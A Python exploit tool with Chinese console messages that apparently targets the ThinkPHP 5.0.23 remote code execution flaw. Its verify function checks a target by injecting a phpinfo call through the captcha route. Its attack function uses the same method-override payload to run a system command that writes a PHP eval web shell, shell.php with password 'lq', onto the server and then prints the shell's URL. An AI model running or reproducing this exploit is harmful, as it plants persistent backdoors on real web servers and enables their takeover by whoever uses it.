import argparse
import re
import sys
import urllib
import requests

def verify(url):
    result = {
        'name': 'Thinkphp 5.0.23 rce',
        'vulnerable': False,
        'attack': False,
    }
    try:
        target = urllib.parse.urljoin(url,'/index.php?s=captcha')
        payload = {
            '_method': '__construct',
            'filter[]': 'phpinfo',
            'method': 'get',
            'server[REQUEST_METHOD]': '1'
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        resopnse = requests.post(url=target,data=payload,headers=headers)
        if re.search(r'PHP Version',resopnse.text):
            result['vulnerable'] = True
            result['attack'] = True
            return result
    except:
        return result

def attack(url):
    try:
        print('开始利用tp5rce')
        target = urllib.parse.urljoin(url, '/index.php?s=captcha')
        payload = {
            '_method': '__construct',
            'filter[]': 'system',
            'method': 'get',
            'server[REQUEST_METHOD]': "echo '<?php eval($_POST[lq]); ?>' > shell.php"
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        resopnse = requests.post(url=target,data=payload,headers=headers)
        webshell=urllib.parse.urljoin(url,'/shell.php')
        print('webshell地址为: '+str(webshell))
        print('密码: lq')
    except:
        return False

def start_verify(self):
    s2 = verify(self)
    print(s2['name'] + str(' ' + str(s2['vulnerable'])))



if __name__ == '__main__':
    print('''--❤ tp5.0.23rce_scan ❤--''')

parser = argparse.ArgumentParser(description='tp2rce')
parser.add_argument('-url', type=str, help="输入目标链接")
parser.add_argument('-attack', type=str, help='执行EXP')
args = parser.parse_args()

try:
    if '-url' in sys.argv:
        print('漏洞检测')
        print()
        start_verify(args.url)
        print()
        print('漏洞检测结束')
    if '-attack' in sys.argv:
        print('漏洞利用')
        print()
        attack(args.attack)
        print()
        print('漏洞利用结束')
except:
    pass
